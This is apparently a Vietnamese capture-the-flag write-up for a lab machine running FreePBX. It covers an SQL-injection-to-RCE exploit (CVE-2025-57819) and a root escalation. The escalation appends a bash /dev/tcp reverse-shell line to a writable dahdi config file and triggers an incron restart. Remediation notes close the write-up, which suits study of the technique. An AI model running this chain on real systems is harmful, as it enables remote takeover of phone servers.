
# Véc tơ tấn công
Asterisk: Nmap -> Web Enumeration -> CVE-2025-57819 -> reverse-shell

Root: System Enumeration -> incron argument that can restart the dahdi service -> modify dahdi conf files -> trigger incron -> root reverse shell
# Nmap
![[Pasted image 20261019011704.png]]

Nhận xét về host:
- Cổng 22 SSH ta không thể làm gì được
- Cổng 80 HTTP và 443 HTTPS: chạy Apache và có hostname là connected.htb

Lưu hostname
![[Pasted image 20261019011923.png]]



# Shell as Asterisk

![[Pasted image 20261019012306.png]]

Enumerate web ta thấy web đang chạy FreePBX 16.0.40.7.

=> trang web bị lỗ hổng https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE về cơ bản là chúng ta có thể sqli bypass authentication -> admin -> code upload php -> web shell -> RCE

![[Pasted image 20261019013229.png]]

chạy script cho ta shell luôn!


# shell as root

![[Pasted image 20261019014443.png]]

System enumeration ta được biết rằng nếu ta viết vài thứ trong file /var/spool/asterisk/sysadmin/dahdi_restart thì dahdi service sẽ bị restart => 


```
find / -type f -name " *. conf" -writable
```


**![[Pasted image 20261019014938.png]]

có vẻ như chúng ta có thể thay đổi được file /etc/dahdi/init.conf => tiêm lệnh revshell vào đó và trigger xem sao

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.9/2234 0>&1'" >> /etc/dahdi/init.conf
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart
```
![[Pasted image 20261019015439.png]]

và.... chúng ta có root!


# Remediation

- Nâng cấp phiên bản FreePBX
- Lọc input tránh sql-injection
- Giới hạn quyền thay đổi file hệ thống ngăn không cho reverse shell
- bỏ bớt incron không cần thiết.


